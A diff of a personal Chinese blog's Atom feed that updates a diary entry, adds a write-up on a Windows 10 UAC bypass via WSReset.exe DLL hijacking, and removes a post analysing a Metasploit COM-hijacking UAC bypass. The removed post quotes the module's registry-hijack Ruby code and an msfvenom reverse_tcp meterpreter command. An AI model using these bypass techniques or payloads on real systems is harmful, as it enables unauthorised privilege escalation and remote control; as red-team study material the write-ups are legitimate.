@@ -6,7 +6,7 @@
   <link href="/atom.xml" rel="self"/>
   
   <link href="http://patrilic.top/"/>
-  <updated>2019-08-27T18:29:12.318Z</updated>
+  <updated>2019-08-29T16:52:29.434Z</updated>
   <id>http://patrilic.top/</id>
   
   <author>
@@ -21,9 +21,9 @@
     <link href="http://patrilic.top/2099/12/31/Tomorrow/"/>
     <id>http://patrilic.top/2099/12/31/Tomorrow/</id>
     <published>2099-12-30T16:00:00.000Z</published>
-    <updated>2019-08-27T18:29:12.318Z</updated>
+    <updated>2019-08-29T16:52:29.434Z</updated>
     
-    <content type="html"><![CDATA[<p><img src="/wallpaper/thumb-1920-485164.jpg" alt></p><h5 id="写给自己"><a href="#写给自己" class="headerlink" title="写给自己"></a>写给自己</h5><hr><hr><hr><hr><p>其实呢，一直想把博客变成一个只属于自己的小块空间，自己想怎么装饰就怎么装饰，想写什么就写什么，甚至之前有段时间只用<code>hexo s</code>233333</p><p>现在觉得呢，还是一样，不用在意别人的眼光，自己做干什么就做什么，慢慢把自己想好好写的东西放在博客上，等以后年纪上去了，也算是有个纪念～</p><p>以后这里我打算写一点自己从生活中经历的事情得到的感悟或者一些有趣的事情吧，本身也不是想搞成纯技术博客的 😁</p><blockquote><pre><code>-- 2019.8.28 早 3点56分</code></pre></blockquote><h5 id="2019-8-28"><a href="#2019-8-28" class="headerlink" title="2019.8.28"></a>2019.8.28</h5><p>还有几天就要正式进入大三的生活了，课还行，主要是感觉可能这辈子的学生生涯也快到头了..</p><p>最近经历很多事情，也看开了，好好学习，好好生活。</p><p>劝诸君： 身体健康才是第一位 ，哎 共勉吧</p><p>明天加油</p><blockquote><p>Just fucking do it dig fucking deep and get it done<br>// 干就对了，不达目的，誓不罢休</p></blockquote>]]></content>
+    <content type="html"><![CDATA[<p><img src="/wallpaper/thumb-1920-485164.jpg" alt></p><h5 id="写给自己"><a href="#写给自己" class="headerlink" title="写给自己"></a>写给自己</h5><hr><blockquote><p>Tomorrow is not just another day in your life<br>It’s the next day in an ‘it does matter’ life</p></blockquote><hr><p>其实呢，一直想把博客变成一个只属于自己的小块空间，自己想怎么装饰就怎么装饰，想写什么就写什么，甚至之前有段时间只用<code>hexo s</code>233333</p><p>现在觉得呢，还是一样，不用在意别人的眼光，自己做干什么就做什么，慢慢把自己想好好写的东西放在博客上，等以后年纪上去了，也算是有个纪念～</p><p>以后这里我打算写一点自己从生活中经历的事情得到的感悟或者一些有趣的事情吧，本身也不是想搞成纯技术博客的 😁</p><blockquote><pre><code>-- 2019.8.28 早 3点56分</code></pre></blockquote><h5 id="2019-8-28"><a href="#2019-8-28" class="headerlink" title="2019.8.28"></a>2019.8.28</h5><p>还有几天就要正式进入大三的生活了，课还行，主要是感觉可能这辈子的学生生涯也快到头了..</p><p>最近经历很多事情，也看开了，好好学习，好好生活。</p><p>劝诸君： 身体健康才是第一位 ，哎 共勉吧</p><p>明天加油</p><blockquote><p>Just fucking do it dig fucking deep and get it done</p></blockquote><h5 id="2019-8-30"><a href="#2019-8-30" class="headerlink" title="2019.8.30"></a>2019.8.30</h5><p>好像今天要开学了，早点休息吧～</p><blockquote><p>Get raw and get intense</p></blockquote>]]></content>
     
     <summary type="html">
     
@@ -31,13 +31,41 @@
       
         &lt;p&gt;&lt;img src=&quot;/wallpaper/thumb-1920-485164.jpg&quot; alt&gt;&lt;/p&gt;
 &lt;h5 id=&quot;写给自己&quot;&gt;&lt;a href=&quot;#写给自己&quot; class=&quot;headerlink&quot; title=&quot;写给自己&quot;&gt;&lt;/a&gt;写给自己&lt;/h5&gt;&lt;hr&gt;
-&lt;hr&gt;
+&lt;blo
       
     
     </summary>
     
       <category term="Diary" scheme="http://patrilic.top/categories/Diary/"/>
     
+    
+  </entry>
+  
+  <entry>
+    <title>Windows10 BypassUAC with WSReset.exe</title>
+    <link href="http://patrilic.top/2019/08/29/Windows10%20BypassUAC%20with%20WSReset.exe/"/>
+    <id>http://patrilic.top/2019/08/29/Windows10 BypassUAC with WSReset.exe/</id>
+    <published>2019-08-29T15:51:00.000Z</published>
+    <updated>2019-08-29T16:44:37.528Z</updated>
+    
+    <content type="html"><![CDATA[<blockquote><p>@Author: Patrilic<br>Time: 2019-08-29 23:51:00<br><img src="/wallpaper/63740442.png" alt></p></blockquote><h2 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h2><p><a href="https://heynowyouseeme.blogspot.com/2019/08/windows-10-lpe-uac-bypass-in-windows.html" target="_blank" rel="noopener">https://heynowyouseeme.blogspot.com/2019/08/windows-10-lpe-uac-bypass-in-windows.html</a></p><p>利用<code>WSReset.exe</code>进行bypassUAC。</p><p>为什么只限于Win10呢，因为这个位于<code>C:\WINDWOS\System32</code> 目录下的程序，是微软商店的一个工具<br><img src="/Windows10 BypassUAC with WSReset.exe.resources/E969032A-4448-40D0-9389-395E1D9502AA.png" alt="6f262c0c97c3dfb682f04fd809cf60e3"></p><h2 id="0x01-Bypass"><a href="#0x01-Bypass" class="headerlink" title="0x01 Bypass"></a>0x01 Bypass</h2><p>这里原作者自己编写了脚本和工具：<br><a href="https://github.com/sailay1996/UAC_bypass_windows_store" target="_blank" rel="noopener">https://github.com/sailay1996/UAC_bypass_windows_store</a></p><p>首先使用<code>UAC.bat</code><br><img src="/Windows10 BypassUAC with WSReset.exe.resources/CB964BB5-BB3A-4D53-A67C-6E6454849741.png" alt="ec35f36d2e88012ed02af35cbc09e1f0"></p><p>创建一个带空格字符的目录，然后把WSReset扔进去</p><p>接着运行<code>uac_bypass.exe</code><br><img src="/Windows10 BypassUAC with WSReset.exe.resources/8FF6C343-6736-4498-A988-5766929E0EFD.png" alt="c4add2018e585c2ca68544c6acabb04e"></p><p>调用DLL，弹出对话框<br><img src="/Windows10 BypassUAC with WSReset.exe.resources/A6D6CAA5-A74F-4965-B791-F1E7FCDDC7B7.png" alt="605ad7a9df01dc55e5392b562a029677"><br>主要就是因为这个👉<br><img src="/Windows10 BypassUAC with WSReset.exe.resources/32B27C2A-82C9-4934-9CCD-3051DBEAC8A7.png" alt="589206bf8c6b67a17a09253985b8e353"></p><p>然后会弹出一个管理员的CMD<br><img src="/Windows10 BypassUAC with WSReset.exe.resources/B375540E-97FA-4751-8A24-9A0385A5341F.png" alt="4c6538e20548f14902cfd64df18f0cb6"></p><p>但是有一个问题是，虚拟机一直保持高速下载<br><img src="/Windows10 BypassUAC with WSReset.exe.resources/92007680-2629-45ED-AE96-E6C8863511D2.png" alt="f1748df2675213d7fa216762acb9be4c"></p><p>感觉程序里有些东西..后面无聊再分析吧。</p><h2 id="0x02-总结"><a href="#0x02-总结" class="headerlink" title="0x02 总结"></a>0x02 总结</h2><p>bypassUAC方法多种多样，看这个只是因为好玩，用微软没啥用的应用商店的组件，其实本质上还是DLL劫持2333</p>]]></content>
+    
+    <summary type="html">
+    
+      
+      
+        &lt;blockquote&gt;
+&lt;p&gt;@Author: Patrilic&lt;br&gt;Time: 2019-08-29 23:51:00&lt;br&gt;&lt;img src=&quot;/wallpaper/63740442.png&quot; alt&gt;&lt;/p&gt;
+&lt;/blockquote&gt;
+&lt;h2 id=&quot;0x00-前言&quot;
+      
+    
+    </summary>
+    
+      <category term="Red-Team Tricks" scheme="http://patrilic.top/categories/Red-Team-Tricks/"/>
+    
+    
+      <category term="内网渗透" scheme="http://patrilic.top/tags/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/"/>
     
   </entry>
   
@@ -526,34 +554,6 @@
     
     
       <category term="CTF" scheme="http://patrilic.top/tags/CTF/"/>
-    
-  </entry>
-  
-  <entry>
-    <title>bypassUAC_via_comhijacking</title>
-    <link href="http://patrilic.top/2019/04/03/bypassUAC_via_comhijacking/"/>
-    <id>http://patrilic.top/2019/04/03/bypassUAC_via_comhijacking/</id>
-    <published>2019-04-03T05:12:49.000Z</published>
-    <updated>2019-08-21T00:42:13.171Z</updated>
-    
-    <content type="html"><![CDATA[<blockquote><p>@Author: Patrilic<br>@Time: 2019-02-03 13:12:49<br><img src="/wallpaper/[35396]宮水の巫女-60268880.jpg" alt></p></blockquote><h2 id="0x01-Com劫持原理"><a href="#0x01-Com劫持原理" class="headerlink" title="0x01 Com劫持原理"></a>0x01 Com劫持原理</h2><p>利用CLSID搜索顺序：</p><ol><li>HKCU\Software\Classes\CLSID</li><li>HKCR\CLSID</li><li>HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\ShellCompatibility\Objects\</li></ol><p>将被劫持的CLSID存入：HKCU\Software\Classes\CLSID</p><p>CLSID 结构<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">HKEY_LOCAL_MACHINE\SOFTWARE\Classes\CLSID   </span><br><span class="line"> &#123;CLSID&#125;       </span><br><span class="line">InprocServer32          (Default) = path          </span><br><span class="line">ThreadingModel     = value</span><br></pre></td></tr></table></figure></p><h2 id="0x02-uacbypass-comhijack分析"><a href="#0x02-uacbypass-comhijack分析" class="headerlink" title="0x02 uacbypass_comhijack分析"></a>0x02 uacbypass_comhijack分析</h2><p>判断系统版本</p><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">check</span></span></span><br><span class="line">    <span class="keyword">if</span> sysinfo[<span class="string">'OS'</span>] =~ <span class="regexp">/Windows (7|8|10|2008|2012|2016)/</span> &amp;&amp; is_uac_enabled? <span class="comment"># 从meterpreter中判断OS版本</span></span><br><span class="line">      Exploit::CheckCode::Appears</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">      Exploit::CheckCode::Safe</span><br><span class="line">    <span class="keyword">end</span></span><br><span class="line">  <span class="keyword">end</span></span><br></pre></td></tr></table></figure><p>劫持点：eventvwr.exe 和 mmc.exe<br><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">@@hijack_points = [</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="symbol">name:</span> <span class="string">'Event Viewer'</span>,</span><br><span class="line">      <span class="symbol">cmd_path:</span> <span class="string">'%WINDIR%\System32\eventvwr.exe'</span>,</span><br><span class="line">      <span class="symbol">class_ids:</span> [<span class="string">'0A29FF9E-7F9C-4437-8B11-F424491E3931'</span>]</span><br><span class="line">    &#125;,</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="symbol">name:</span> <span class="string">'Computer Managment'</span>,</span><br><span class="line">      <span class="symbol">cmd_path:</span> <span class="string">'%WINDIR%\System32\mmc.exe'</span>,</span><br><span class="line">      <span class="symbol">cmd_args:</span> <span class="string">'CompMgmt.msc'</span>,</span><br><span class="line">      <span class="symbol">class_ids:</span> [<span class="string">'0A29FF9E-7F9C-4437-8B11-F424491E3931'</span>]</span><br><span class="line">    &#125;</span><br><span class="line">  ]</span><br></pre></td></tr></table></figure></p><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">hijack_com</span><span class="params">(registry_view, dll_path)</span></span></span><br><span class="line">    target = @@hijack_points.sample</span><br><span class="line">    target_clsid = target[<span class="symbol">:class_ids</span>].sample</span><br><span class="line">    root_key = <span class="string">"<span class="subst">#&#123;CLSID_PATH&#125;</span>\\&#123;<span class="subst">#&#123;target_clsid&#125;</span>&#125;"</span></span><br><span class="line">    inproc_key = <span class="string">"<span class="subst">#&#123;root_key&#125;</span>\\InProcServer32"</span></span><br><span class="line">    shell_key = <span class="string">"<span class="subst">#&#123;root_key&#125;</span>\\ShellFolder"</span></span><br><span class="line"></span><br><span class="line">    registry_createkey(root_key, registry_view)</span><br><span class="line">    registry_createkey(inproc_key, registry_view)</span><br><span class="line">    registry_createkey(shell_key, registry_view)</span><br><span class="line">   </span><br><span class="line">    registry_setvaldata(inproc_key, DEFAULT_VAL_NAME, dll_path, <span class="string">'REG_SZ'</span>, registry_view)</span><br><span class="line">    registry_setvaldata(inproc_key, <span class="string">'ThreadingModel'</span>, <span class="string">'Apartment'</span>, <span class="string">'REG_SZ'</span>, registry_view)</span><br><span class="line">    registry_setvaldata(inproc_key, <span class="string">'LoadWithoutCOM'</span>, <span class="string">''</span>, <span class="string">'REG_SZ'</span>, registry_view)</span><br><span class="line">    registry_setvaldata(shell_key, <span class="string">'HideOnDesktop'</span>, <span class="string">''</span>, <span class="string">'REG_SZ'</span>, registry_view)</span><br><span class="line">    registry_setvaldata(shell_key, <span class="string">'Attributes'</span>, <span class="number">0xf090013d</span>, <span class="string">'REG_DWORD'</span>, registry_view)</span><br><span class="line"></span><br><span class="line">    &#123;</span><br><span class="line">      <span class="symbol">name:</span>     target[<span class="symbol">:name</span>],</span><br><span class="line">      <span class="symbol">cmd_path:</span> target[<span class="symbol">:cmd_path</span>],</span><br><span class="line">      <span class="symbol">cmd_args:</span> target[<span class="symbol">:cmd_args</span>],</span><br><span class="line">      <span class="symbol">root_key:</span> root_key</span><br><span class="line">    &#125;</span><br><span class="line">  <span class="keyword">end</span></span><br></pre></td></tr></table></figure><p>向注册表添加</p><blockquote><p>HKCU\Software\Classes\CLSID{0A29FF9E-7F9C-4437-8B11-F424491E3931}\InProcServer32<br>HKCU\Software\Classes\CLSID{0A29FF9E-7F9C-4437-8B11-F424491E3931}\ShellFolder</p></blockquote><p>InProcServer 中：</p><ul><li>Default -&gt; dll_path</li><li>ThreadingModel -&gt; Apartment</li><li>LoadWithoutCOM -&gt; Null</li></ul><p>ShellFolder 中：</p><ul><li>HideOnDesktop -&gt; Null</li><li>Attributes -&gt; 0xf090013d</li></ul><h2 id="0x03-复现"><a href="#0x03-复现" class="headerlink" title="0x03 复现"></a>0x03 复现</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p windows/x64/meterpreter/reverse_tcp lhost=10.131.36.131 lport=4444 -f exe &gt; out.exe</span><br></pre></td></tr></table></figure><p><img src="/无标题.resources/0E2986DD-BCFB-443E-AFB1-884B8BBB60EF.png" alt="7b0554d147b29f2ea26ae50de761fd1a"><br>回弹拿到meterpreter session</p><p><img src="/无标题.resources/14E6038F-66BC-4AD3-9AC5-60A3B370D8A3.png" alt="2e3c6b217fb1c0f6eb5ee8e7e645c081"></p><p>无法getsystem</p><p><img src="/无标题.resources/F2BE433B-9D87-4A45-925C-701F6E351B27.png" alt="141b1b876500404f9687d93866b5a8e2"></p><p>可以看到，劫持了CLSID {0A29FF9E-7F9C-4437-8B11-F424491E3931}的会话，成功拿到反弹session</p>]]></content>
-    
-    <summary type="html">
-    
-      
-      
-        &lt;blockquote&gt;
-&lt;p&gt;@Author: Patrilic&lt;br&gt;@Time: 2019-02-03 13:12:49&lt;br&gt;&lt;img src=&quot;/wallpaper/[35396]宮水の巫女-60268880.jpg&quot; alt&gt;&lt;/p&gt;
-&lt;/blockquote&gt;
-&lt;h
-      
-    
-    </summary>
-    
-      <category term="Red-Team Tricks" scheme="http://patrilic.top/categories/Red-Team-Tricks/"/>
-    
-    
-      <category term="内网渗透" scheme="http://patrilic.top/tags/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/"/>
     
   </entry>
   
